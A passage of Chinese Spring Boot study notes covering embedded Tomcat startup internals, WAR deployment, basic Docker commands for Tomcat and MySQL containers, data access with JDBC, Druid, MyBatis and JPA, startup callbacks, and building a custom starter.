ServletContextInitializer... initializers);} 2）、EmbeddedServletContainer：（嵌入式的Servlet容器） 3）、以TomcatEmbeddedServletContainerFactory为例 123456789101112131415161718192021222324@Overridepublic EmbeddedServletContainer getEmbeddedServletContainer( ServletContextInitializer... initializers) { //创建一个Tomcat Tomcat tomcat = new Tomcat(); //配置Tomcat的基本环节 File baseDir = (this.baseDirectory != null ? this.baseDirectory : createTempDir(\"tomcat\")); tomcat.setBaseDir(baseDir.getAbsolutePath()); Connector connector = new Connector(this.protocol); tomcat.getService().addConnector(connector); customizeConnector(connector); tomcat.setConnector(connector); tomcat.getHost().setAutoDeploy(false); configureEngine(tomcat.getEngine()); for (Connector additionalConnector : this.additionalTomcatConnectors) { tomcat.getService().addConnector(additionalConnector); } prepareContext(tomcat.getHost(), initializers); //将配置好的Tomcat传入进去，返回一个EmbeddedServletContainer；并且启动Tomcat服务器 return getTomcatEmbeddedServletContainer(tomcat);} 4）、我们对嵌入式容器的配置修改是怎么生效？ 1ServerProperties、EmbeddedServletContainerCustomizer EmbeddedServletContainerCustomizer：定制器帮我们修改了Servlet容器的配置？ 怎么修改的原理？ 5）、容器中导入了EmbeddedServletContainerCustomizerBeanPostProcessor 12345678910111213141516171819202122232425262728293031323334353637//初始化之前@Overridepublic Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException { //如果当前初始化的是一个ConfigurableEmbeddedServletContainer类型的组件 if (bean instanceof ConfigurableEmbeddedServletContainer) { // postProcessBeforeInitialization((ConfigurableEmbeddedServletContainer) bean); } return bean;}private void postProcessBeforeInitialization( ConfigurableEmbeddedServletContainer bean) { //获取所有的定制器，调用每一个定制器的customize方法来给Servlet容器进行属性赋值； for (EmbeddedServletContainerCustomizer customizer : getCustomizers()) { customizer.customize(bean); }}private Collection&lt;EmbeddedServletContainerCustomizer&gt; getCustomizers() { if (this.customizers == null) { // Look up does not include the parent context this.customizers = new ArrayList&lt;EmbeddedServletContainerCustomizer&gt;( this.beanFactory //从容器中获取所有这葛类型的组件：EmbeddedServletContainerCustomizer //定制Servlet容器，给容器中可以添加一个EmbeddedServletContainerCustomizer类型的组件 .getBeansOfType(EmbeddedServletContainerCustomizer.class, false, false) .values()); Collections.sort(this.customizers, AnnotationAwareOrderComparator.INSTANCE); this.customizers = Collections.unmodifiableList(this.customizers); } return this.customizers;}ServerProperties也是定制器 步骤： 1）、SpringBoot根据导入的依赖情况，给容器中添加相应的EmbeddedServletContainerFactory【TomcatEmbeddedServletContainerFactory】 2）、容器中某个组件要创建对象就会惊动后置处理器；EmbeddedServletContainerCustomizerBeanPostProcessor； 只要是嵌入式的Servlet容器工厂，后置处理器就工作； 3）、后置处理器，从容器中获取所有的EmbeddedServletContainerCustomizer，调用定制器的定制方法 ###5）、嵌入式Servlet容器启动原理； 什么时候创建嵌入式的Servlet容器工厂？什么时候获取嵌入式的Servlet容器并启动Tomcat； 获取嵌入式的Servlet容器工厂： 1）、SpringBoot应用启动运行run方法 2）、refreshContext(context);SpringBoot刷新IOC容器【创建IOC容器对象，并初始化容器，创建容器中的每一个组件】；如果是web应用创建AnnotationConfigEmbeddedWebApplicationContext，否则：AnnotationConfigApplicationContext 3）、refresh(context);刷新刚才创建好的ioc容器； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263public void refresh() throws BeansException, IllegalStateException { synchronized (this.startupShutdownMonitor) { // Prepare this context for refreshing. prepareRefresh(); // Tell the subclass to refresh the internal bean factory. ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory(); // Prepare the bean factory for use in this context. prepareBeanFactory(beanFactory); try { // Allows post-processing of the bean factory in context subclasses. postProcessBeanFactory(beanFactory); // Invoke factory processors registered as beans in the context. invokeBeanFactoryPostProcessors(beanFactory); // Register bean processors that intercept bean creation. registerBeanPostProcessors(beanFactory); // Initialize message source for this context. initMessageSource(); // Initialize event multicaster for this context. initApplicationEventMulticaster(); // Initialize other special beans in specific context subclasses. onRefresh(); // Check for listener beans and register them. registerListeners(); // Instantiate all remaining (non-lazy-init) singletons. finishBeanFactoryInitialization(beanFactory); // Last step: publish corresponding event. finishRefresh(); } catch (BeansException ex) { if (logger.isWarnEnabled()) { logger.warn(\"Exception encountered during context initialization - \" + \"cancelling refresh attempt: \" + ex); } // Destroy already created singletons to avoid dangling resources. destroyBeans(); // Reset 'active' flag. cancelRefresh(ex); // Propagate exception to caller. throw ex; } finally { // Reset common introspection caches in Spring's core, since we // might not ever need metadata for singleton beans anymore... resetCommonCaches(); } }} 4）、 onRefresh(); web的ioc容器重写了onRefresh方法 5）、webioc容器会创建嵌入式的Servlet容器；createEmbeddedServletContainer(); 6）、获取嵌入式的Servlet容器工厂： EmbeddedServletContainerFactory containerFactory = getEmbeddedServletContainerFactory(); ​ 从ioc容器中获取EmbeddedServletContainerFactory 组件；TomcatEmbeddedServletContainerFactory创建对象，后置处理器一看是这个对象，就获取所有的定制器来先定制Servlet容器的相关配置； 7）、使用容器工厂获取嵌入式的Servlet容器：this.embeddedServletContainer = containerFactory .getEmbeddedServletContainer(getSelfInitializer()); 8）、嵌入式的Servlet容器创建对象并启动Servlet容器； 先启动嵌入式的Servlet容器，再将ioc容器中剩下没有创建出的对象获取出来； ==IOC容器启动创建嵌入式的Servlet容器== 9、使用外置的Servlet容器嵌入式Servlet容器：应用打成可执行的jar ​ 优点：简单、便携； ​ 缺点：默认不支持JSP、优化定制比较复杂（使用定制器【ServerProperties、自定义EmbeddedServletContainerCustomizer】，自己编写嵌入式Servlet容器的创建工厂【EmbeddedServletContainerFactory】）； 外置的Servlet容器：外面安装Tomcat—应用war包的方式打包； 步骤1）、必须创建一个war项目；（利用idea创建好目录结构） 2）、将嵌入式的Tomcat指定为provided； 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; 3）、必须编写一个SpringBootServletInitializer的子类，并调用configure方法 123456789public class ServletInitializer extends SpringBootServletInitializer { @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder application) { //传入SpringBoot应用的主程序 return application.sources(SpringBoot04WebJspApplication.class); }} 4）、启动服务器就可以使用； 原理jar包：执行SpringBoot主类的main方法，启动ioc容器，创建嵌入式的Servlet容器； war包：启动服务器，服务器启动SpringBoot应用【SpringBootServletInitializer】，启动ioc容器； servlet3.0（Spring注解版）： 8.2.4 Shared libraries / runtimes pluggability： 规则： ​ 1）、服务器启动（web应用启动）会创建当前web应用里面每一个jar包里面ServletContainerInitializer实例： ​ 2）、ServletContainerInitializer的实现放在jar包的META-INF/services文件夹下，有一个名为javax.servlet.ServletContainerInitializer的文件，内容就是ServletContainerInitializer的实现类的全类名 ​ 3）、还可以使用@HandlesTypes，在应用启动的时候加载我们感兴趣的类； 流程： 1）、启动Tomcat 2）、org\\springframework\\spring-web\\4.3.14.RELEASE\\spring-web-4.3.14.RELEASE.jar!\\META-INF\\services\\javax.servlet.ServletContainerInitializer： Spring的web模块里面有这个文件：org.springframework.web.SpringServletContainerInitializer 3）、SpringServletContainerInitializer将@HandlesTypes(WebApplicationInitializer.class)标注的所有这个类型的类都传入到onStartup方法的Set&lt;Class&lt;?&gt;&gt;；为这些WebApplicationInitializer类型的类创建实例； 4）、每一个WebApplicationInitializer都调用自己的onStartup； 5）、相当于我们的SpringBootServletInitializer的类会被创建对象，并执行onStartup方法 6）、SpringBootServletInitializer实例执行onStartup的时候会createRootApplicationContext；创建容器 1234567891011121314151617181920212223242526272829303132333435363738protected WebApplicationContext createRootApplicationContext( ServletContext servletContext) { //1、创建SpringApplicationBuilder SpringApplicationBuilder builder = createSpringApplicationBuilder(); StandardServletEnvironment environment = new StandardServletEnvironment(); environment.initPropertySources(servletContext, null); builder.environment(environment); builder.main(getClass()); ApplicationContext parent = getExistingRootWebApplicationContext(servletContext); if (parent != null) { this.logger.info(\"Root context already created (using as parent).\"); servletContext.setAttribute( WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, null); builder.initializers(new ParentContextApplicationContextInitializer(parent)); } builder.initializers( new ServletContextApplicationContextInitializer(servletContext)); builder.contextClass(AnnotationConfigEmbeddedWebApplicationContext.class); //调用configure方法，子类重写了这个方法，将SpringBoot的主程序类传入了进来 builder = configure(builder); //使用builder创建一个Spring应用 SpringApplication application = builder.build(); if (application.getSources().isEmpty() &amp;&amp; AnnotationUtils .findAnnotation(getClass(), Configuration.class) != null) { application.getSources().add(getClass()); } Assert.state(!application.getSources().isEmpty(), \"No SpringApplication sources have been defined. Either override the \" + \"configure method or add an @Configuration annotation\"); // Ensure error pages are registered if (this.registerErrorPageFilter) { application.getSources().add(ErrorPageFilterConfiguration.class); } //启动Spring应用 return run(application);} 7）、Spring的应用就启动并且创建IOC容器 1234567891011121314151617181920212223242526272829303132333435public ConfigurableApplicationContext run(String... args) { StopWatch stopWatch = new StopWatch(); stopWatch.start(); ConfigurableApplicationContext context = null; FailureAnalyzers analyzers = null; configureHeadlessProperty(); SpringApplicationRunListeners listeners = getRunListeners(args); listeners.starting(); try { ApplicationArguments applicationArguments = new DefaultApplicationArguments( args); ConfigurableEnvironment environment = prepareEnvironment(listeners, applicationArguments); Banner printedBanner = printBanner(environment); context = createApplicationContext(); analyzers = new FailureAnalyzers(context); prepareContext(context, environment, listeners, applicationArguments, printedBanner); //刷新IOC容器 refreshContext(context); afterRefresh(context, applicationArguments); listeners.finished(context, null); stopWatch.stop(); if (this.logStartupInfo) { new StartupInfoLogger(this.mainApplicationClass) .logStarted(getApplicationLog(), stopWatch); } return context; } catch (Throwable ex) { handleRunFailure(context, listeners, analyzers, ex); throw new IllegalStateException(ex); }} ==启动Servlet容器，再启动SpringBoot应用== 五、Docker1、简介Docker是一个开源的应用容器引擎；是一个轻量级容器技术； Docker支持将软件编译成一个镜像；然后在镜像中各种软件做好配置，将镜像发布出去，其他使用者可以直接使用这个镜像； 运行中的这个镜像称为容器，容器启动是非常快速的。 2、核心概念docker主机(Host)：安装了Docker程序的机器（Docker直接安装在操作系统之上）； docker客户端(Client)：连接docker主机进行操作； docker仓库(Registry)：用来保存各种打包好的软件镜像； docker镜像(Images)：软件打包好的镜像；放在docker仓库中； docker容器(Container)：镜像启动后的实例称为一个容器；容器是独立运行的一个或一组应用 使用Docker的步骤： 1）、安装Docker 2）、去Docker仓库找到这个软件对应的镜像； 3）、使用Docker运行这个镜像，这个镜像就会生成一个Docker容器； 4）、对容器的启动停止就是对软件的启动停止； 3、安装Docker1）、安装linux虚拟机​ 1）、VMWare、VirtualBox（安装）； ​ 2）、导入虚拟机文件centos7-atguigu.ova； ​ 3）、双击启动linux虚拟机;使用 root/ 123456登陆 ​ 4）、使用客户端连接linux服务器进行命令操作； ​ 5）、设置虚拟机网络； ​ 桥接网络===选好网卡====接入网线； ​ 6）、设置好网络以后使用命令重启虚拟机的网络 1service network restart ​ 7）、查看linux的ip地址 1ip addr ​ 8）、使用客户端连接linux； 2）、在linux虚拟机上安装docker步骤： 12345678910111213141、检查内核版本，必须是3.10及以上uname -r2、安装dockeryum install docker3、输入y确认安装4、启动docker[root@localhost ~]# systemctl start docker[root@localhost ~]# docker -vDocker version 1.12.6, build 3e8e77d/1.12.65、开机启动docker[root@localhost ~]# systemctl enable dockerCreated symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.6、停止dockersystemctl stop docker 4、Docker常用命令&amp;操作1）、镜像操作 操作 命令 说明 检索 docker search 关键字 eg：docker search redis 我们经常去docker hub上检索镜像的详细信息，如镜像的TAG。 拉取 docker pull 镜像名:tag :tag是可选的，tag表示标签，多为软件的版本，默认是latest 列表 docker images 查看所有本地镜像 删除 docker rmi image-id 删除指定的本地镜像 https://hub.docker.com/ 2）、容器操作软件镜像（QQ安装程序）—-运行镜像—-产生一个容器（正在运行的软件，运行的QQ）； 步骤： 123456789101112131415161718192021222324252627282930311、搜索镜像[root@localhost ~]# docker search tomcat2、拉取镜像[root@localhost ~]# docker pull tomcat3、根据镜像启动容器docker run --name mytomcat -d tomcat:latest4、docker ps 查看运行中的容器5、 停止运行中的容器docker stop 容器的id6、查看所有的容器docker ps -a7、启动容器docker start 容器id8、删除一个容器 docker rm 容器id9、启动一个做了端口映射的tomcat[root@localhost ~]# docker run -d -p 8888:8080 tomcat-d：后台运行-p: 将主机的端口映射到容器的一个端口 主机端口:容器内部的端口10、为了演示简单关闭了linux的防火墙service firewalld status ；查看防火墙状态service firewalld stop：关闭防火墙11、查看容器的日志docker logs container-name/container-id更多命令参看https://docs.docker.com/engine/reference/commandline/docker/可以参考每一个镜像的文档 3）、安装MySQL示例1docker pull mysql 错误的启动 1234567891011121314151617[root@localhost ~]# docker run --name mysql01 -d mysql42f09819908bb72dd99ae19e792e0a5d03c48638421fa64cce5f8ba0f40f5846mysql退出了[root@localhost ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES42f09819908b mysql \"docker-entrypoint.sh\" 34 seconds ago Exited (1) 33 seconds ago mysql01538bde63e500 tomcat \"catalina.sh run\" About an hour ago Exited (143) About an hour ago compassionate_goldstinec4f1ac60b3fc tomcat \"catalina.sh run\" About an hour ago Exited (143) About an hour ago lonely_fermi81ec743a5271 tomcat \"catalina.sh run\" About an hour ago Exited (143) About an hour ago sick_ramanujan//错误日志[root@localhost ~]# docker logs 42f09819908berror: database is uninitialized and password option is not specified You need to specify one of MYSQL_ROOT_PASSWORD, MYSQL_ALLOW_EMPTY_PASSWORD and MYSQL_RANDOM_ROOT_PASSWORD；这个三个参数必须指定一个 正确的启动 12345[root@localhost ~]# docker run --name mysql01 -e MYSQL_ROOT_PASSWORD=123456 -d mysqlb874c56bec49fb43024b3805ab51e9097da779f2f572c22c695305dedd684c5f[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESb874c56bec49 mysql \"docker-entrypoint.sh\" 4 seconds ago Up 3 seconds 3306/tcp mysql01 做了端口映射 12345[root@localhost ~]# docker run -p 3306:3306 --name mysql02 -e MYSQL_ROOT_PASSWORD=123456 -d mysqlad10e4bc5c6a0f61cbad43898de71d366117d120e39db651844c0e73863b9434[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESad10e4bc5c6a mysql \"docker-entrypoint.sh\" 4 seconds ago Up 2 seconds 0.0.0.0:3306-&gt;3306/tcp mysql02 几个其他的高级操作 123456docker run --name mysql03 -v /conf/mysql:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag把主机的/conf/mysql文件夹挂载到 mysqldocker容器的/etc/mysql/conf.d文件夹里面改mysql的配置文件就只需要把mysql配置文件放在自定义的文件夹下（/conf/mysql）docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci指定mysql的一些配置参数 六、SpringBoot与数据访问1、JDBC123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; 123456spring: datasource: username: root password: 123456 url: jdbc:mysql://192.168.15.22:3306/jdbc driver-class-name: com.mysql.jdbc.Driver 效果： ​ 默认是用org.apache.tomcat.jdbc.pool.DataSource作为数据源； ​ 数据源的相关配置都在DataSourceProperties里面； 自动配置原理： org.springframework.boot.autoconfigure.jdbc： 1、参考DataSourceConfiguration，根据配置创建数据源，默认使用Tomcat连接池；可以使用spring.datasource.type指定自定义的数据源类型； 2、SpringBoot默认可以支持； 1org.apache.tomcat.jdbc.pool.DataSource、HikariDataSource、BasicDataSource、 3、自定义数据源类型 1234567891011121314/** * Generic DataSource configuration. */@ConditionalOnMissingBean(DataSource.class)@ConditionalOnProperty(name = \"spring.datasource.type\")static class Generic { @Bean public DataSource dataSource(DataSourceProperties properties) { //使用DataSourceBuilder创建数据源，利用反射创建响应type的数据源，并且绑定相关属性 return properties.initializeDataSourceBuilder().build(); }} 4、DataSourceInitializer：ApplicationListener； ​ 作用： ​ 1）、runSchemaScripts();运行建表语句； ​ 2）、runDataScripts();运行插入数据的sql语句； 默认只需要将文件命名为： 123456schema-*.sql、data-*.sql默认规则：schema.sql，schema-all.sql；可以使用 schema: - classpath:department.sql 指定位置 5、操作数据库：自动配置了JdbcTemplate操作数据库 2、整合Druid数据源1234567891011121314151617181920212223242526272829303132333435363738394041424344导入druid数据源@Configurationpublic class DruidConfig { @ConfigurationProperties(prefix = \"spring.datasource\") @Bean public DataSource druid(){ return new DruidDataSource(); } //配置Druid的监控 //1、配置一个管理后台的Servlet @Bean public ServletRegistrationBean statViewServlet(){ ServletRegistrationBean bean = new ServletRegistrationBean(new StatViewServlet(), \"/druid/*\"); Map&lt;String,String&gt; initParams = new HashMap&lt;&gt;(); initParams.put(\"loginUsername\",\"admin\"); initParams.put(\"loginPassword\",\"123456\"); initParams.put(\"allow\",\"\");//默认就是允许所有访问 initParams.put(\"deny\",\"192.168.15.21\"); bean.setInitParameters(initParams); return bean; } //2、配置一个web监控的filter @Bean public FilterRegistrationBean webStatFilter(){ FilterRegistrationBean bean = new FilterRegistrationBean(); bean.setFilter(new WebStatFilter()); Map&lt;String,String&gt; initParams = new HashMap&lt;&gt;(); initParams.put(\"exclusions\",\"*.js,*.css,/druid/*\"); bean.setInitParameters(initParams); bean.setUrlPatterns(Arrays.asList(\"/*\")); return bean; }} 3、整合MyBatis12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.1&lt;/version&gt;&lt;/dependency&gt; 步骤： ​ 1）、配置数据源相关属性（见上一节Druid） ​ 2）、给数据库建表 ​ 3）、创建JavaBean 4）、注解版1234567891011121314151617//指定这是一个操作数据库的mapper@Mapperpublic interface DepartmentMapper { @Select(\"select * from department where id=#{id}\") public Department getDeptById(Integer id); @Delete(\"delete from department where id=#{id}\") public int deleteDeptById(Integer id); @Options(useGeneratedKeys = true,keyProperty = \"id\") @Insert(\"insert into department(departmentName) values(#{departmentName})\") public int insertDept(Department department); @Update(\"update department set departmentName=#{departmentName} where id=#{id}\") public int updateDept(Department department);} 问题： 自定义MyBatis的配置规则；给容器中添加一个ConfigurationCustomizer； 1234567891011121314@org.springframework.context.annotation.Configurationpublic class MyBatisConfig { @Bean public ConfigurationCustomizer configurationCustomizer(){ return new ConfigurationCustomizer(){ @Override public void customize(Configuration configuration) { configuration.setMapUnderscoreToCamelCase(true); } }; }} 123456789使用MapperScan批量扫描所有的Mapper接口；@MapperScan(value = \"com.atguigu.springboot.mapper\")@SpringBootApplicationpublic class SpringBoot06DataMybatisApplication { public static void main(String[] args) { SpringApplication.run(SpringBoot06DataMybatisApplication.class, args); }} 5）、配置文件版123mybatis: config-location: classpath:mybatis/mybatis-config.xml 指定全局配置文件的位置 mapper-locations: classpath:mybatis/mapper/*.xml 指定sql映射文件的位置 更多使用参照 http://www.mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/ 4、整合SpringData JPA1）、SpringData简介 2）、整合SpringData JPAJPA:ORM（Object Relational Mapping）； 1）、编写一个实体类（bean）和数据表进行映射，并且配置好映射关系； 12345678910111213//使用JPA注解配置映射关系@Entity //告诉JPA这是一个实体类（和数据表映射的类）@Table(name = \"tbl_user\") //@Table来指定和哪个数据表对应;如果省略默认表名就是user；public class User { @Id //这是一个主键 @GeneratedValue(strategy = GenerationType.IDENTITY)//自增主键 private Integer id; @Column(name = \"last_name\",length = 50) //这是和数据表对应的一个列 private String lastName; @Column //省略默认列名就是属性名 private String email; 2）、编写一个Dao接口来操作实体类对应的数据表（Repository） 1234//继承JpaRepository来完成对数据库的操作public interface UserRepository extends JpaRepository&lt;User,Integer&gt; {} 3）、基本的配置JpaProperties 1234567spring: jpa: hibernate:# 更新或者创建数据表结构 ddl-auto: update# 控制台显示SQL show-sql: true 七、启动配置原理几个重要的事件回调机制 配置在META-INF/spring.factories ApplicationContextInitializer SpringApplicationRunListener 只需要放在ioc容器中 ApplicationRunner CommandLineRunner 启动流程： 1、创建SpringApplication对象12345678910111213141516initialize(sources);private void initialize(Object[] sources) { //保存主配置类 if (sources != null &amp;&amp; sources.length &gt; 0) { this.sources.addAll(Arrays.asList(sources)); } //判断当前是否一个web应用 this.webEnvironment = deduceWebEnvironment(); //从类路径下找到META-INF/spring.factories配置的所有ApplicationContextInitializer；然后保存起来 setInitializers((Collection) getSpringFactoriesInstances( ApplicationContextInitializer.class)); //从类路径下找到ETA-INF/spring.factories配置的所有ApplicationListener setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class)); //从多个配置类中找到有main方法的主配置类 this.mainApplicationClass = deduceMainApplicationClass();} 2、运行run方法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public ConfigurableApplicationContext run(String... args) { StopWatch stopWatch = new StopWatch(); stopWatch.start(); ConfigurableApplicationContext context = null; FailureAnalyzers analyzers = null; configureHeadlessProperty(); //获取SpringApplicationRunListeners；从类路径下META-INF/spring.factories SpringApplicationRunListeners listeners = getRunListeners(args); //回调所有的获取SpringApplicationRunListener.starting()方法 listeners.starting(); try { //封装命令行参数 ApplicationArguments applicationArguments = new DefaultApplicationArguments( args); //准备环境 ConfigurableEnvironment environment = prepareEnvironment(listeners, applicationArguments); //创建环境完成后回调SpringApplicationRunListener.environmentPrepared()；表示环境准备完成 Banner printedBanner = printBanner(environment); //创建ApplicationContext；决定创建web的ioc还是普通的ioc context = createApplicationContext(); analyzers = new FailureAnalyzers(context); //准备上下文环境;将environment保存到ioc中；而且applyInitializers()； //applyInitializers()：回调之前保存的所有的ApplicationContextInitializer的initialize方法 //回调所有的SpringApplicationRunListener的contextPrepared()； // prepareContext(context, environment, listeners, applicationArguments, printedBanner); //prepareContext运行完成以后回调所有的SpringApplicationRunListener的contextLoaded（）； //s刷新容器；ioc容器初始化（如果是web应用还会创建嵌入式的Tomcat）；Spring注解版 //扫描，创建，加载所有组件的地方；（配置类，组件，自动配置） refreshContext(context); //从ioc容器中获取所有的ApplicationRunner和CommandLineRunner进行回调 //ApplicationRunner先回调，CommandLineRunner再回调 afterRefresh(context, applicationArguments); //所有的SpringApplicationRunListener回调finished方法 listeners.finished(context, null); stopWatch.stop(); if (this.logStartupInfo) { new StartupInfoLogger(this.mainApplicationClass) .logStarted(getApplicationLog(), stopWatch); } //整个SpringBoot应用启动完成以后返回启动的ioc容器； return context; } catch (Throwable ex) { handleRunFailure(context, listeners, analyzers, ex); throw new IllegalStateException(ex); }} 3、事件监听机制配置在META-INF/spring.factories ApplicationContextInitializer 1234567public class HelloApplicationContextInitializer implements ApplicationContextInitializer&lt;ConfigurableApplicationContext&gt; { @Override public void initialize(ConfigurableApplicationContext applicationContext) { System.out.println(\"ApplicationContextInitializer...initialize...\"+applicationContext); }} SpringApplicationRunListener 12345678910111213141516171819202122232425262728293031323334public class HelloSpringApplicationRunListener implements SpringApplicationRunListener { //必须有的构造器 public HelloSpringApplicationRunListener(SpringApplication application, String[] args){ } @Override public void starting() { System.out.println(\"SpringApplicationRunListener...starting...\"); } @Override public void environmentPrepared(ConfigurableEnvironment environment) { Object o = environment.getSystemProperties().get(\"os.name\"); System.out.println(\"SpringApplicationRunListener...environmentPrepared..\"+o); } @Override public void contextPrepared(ConfigurableApplicationContext context) { System.out.println(\"SpringApplicationRunListener...contextPrepared...\"); } @Override public void contextLoaded(ConfigurableApplicationContext context) { System.out.println(\"SpringApplicationRunListener...contextLoaded...\"); } @Override public void finished(ConfigurableApplicationContext context, Throwable exception) { System.out.println(\"SpringApplicationRunListener...finished...\"); }} 配置（META-INF/spring.factories） 12345org.springframework.context.ApplicationContextInitializer=\\com.atguigu.springboot.listener.HelloApplicationContextInitializerorg.springframework.boot.SpringApplicationRunListener=\\com.atguigu.springboot.listener.HelloSpringApplicationRunListener 只需要放在ioc容器中 ApplicationRunner 1234567@Componentpublic class HelloApplicationRunner implements ApplicationRunner { @Override public void run(ApplicationArguments args) throws Exception { System.out.println(\"ApplicationRunner...run....\"); }} CommandLineRunner 1234567@Componentpublic class HelloCommandLineRunner implements CommandLineRunner { @Override public void run(String... args) throws Exception { System.out.println(\"CommandLineRunner...run...\"+ Arrays.asList(args)); }} 八、自定义starterstarter： ​ 1、这个场景需要使用到的依赖是什么？ ​ 2、如何编写自动配置 12345678910111213@Configuration //指定这个类是一个配置类@ConditionalOnXXX //在指定条件成立的情况下自动配置类生效@AutoConfigureAfter //指定自动配置类的顺序@Bean //给容器中添加组件@ConfigurationPropertie结合相关xxxProperties类来绑定相关的配置@EnableConfigurationProperties //让xxxProperties生效加入到容器中自动配置类要能加载将需要启动就加载的自动配置类，配置在META-INF/spring.factoriesorg.springframework.boot.autoconfigure.EnableAutoConfiguration=\\org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\\org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\\ ​ 3、模式： 启动器只用来做依赖导入； 专门来写一个自动配置模块； 启动器依赖自动配置；别人只需要引入启动器（starter） mybatis-spring-boot-starter；自定义启动器名-spring-boot-starter 步骤： 1）、启动器模块 12345678910111213141516171819202122&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.atguigu.starter&lt;/groupId&gt; &lt;artifactId&gt;atguigu-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;!--启动器--&gt; &lt;dependencies&gt; &lt;!--引入自动配置模块--&gt; &lt;dependency&gt; &lt;groupId&gt;com.atguigu.starter&lt;/groupId&gt; &lt;artifactId&gt;atguigu-spring-boot-starter-autoconfigurer&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 2）、自动配置模块 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.atguigu.starter&lt;/groupId&gt; &lt;artifactId&gt;atguigu-spring-boot-starter-autoconfigurer&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;atguigu-spring-boot-starter-autoconfigurer&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.5.10.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!--引入spring-boot-starter；所有starter的基本配置--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 123456789101112131415161718192021222324252627package com.atguigu.starter;import org.springframework.boot.context.properties.ConfigurationProperties;@ConfigurationProperties(prefix = \"atguigu.hello\")public class HelloProperties { private String prefix; private String suffix; public String getPrefix() { return prefix; } public void setPrefix(String prefix) { this.prefix = prefix; } public String getSuffix() { return suffix; } public void setSuffix(String suffix) { this.suffix = suffix; }} 12345678910111213141516171819package com.atguigu.starter;public class HelloService { HelloProperties helloProperties; public HelloProperties getHelloProperties() { return helloProperties; } public void setHelloProperties(HelloProperties helloProperties) { this.helloProperties = helloProperties; } public String sayHellAtguigu(String name){ return helloProperties.getPrefix()+\"-\" +name + helloProperties.getSuffix(); }} 1234567891011121314151617181920212223package com.atguigu.starter;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.autoconfigure.condition.ConditionalOnWebApplication;import org.springframework.boot.context.properties.EnableConfigurationProperties;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configuration@ConditionalOnWebApplication //web应用才生效@EnableConfigurationProperties(HelloProperties.class)public class HelloServiceAutoConfiguration { @Autowired HelloProperties helloProperties; @Bean public HelloService helloService(){ HelloService service = new HelloService(); service.setHelloProperties(helloProperties); return service; }} 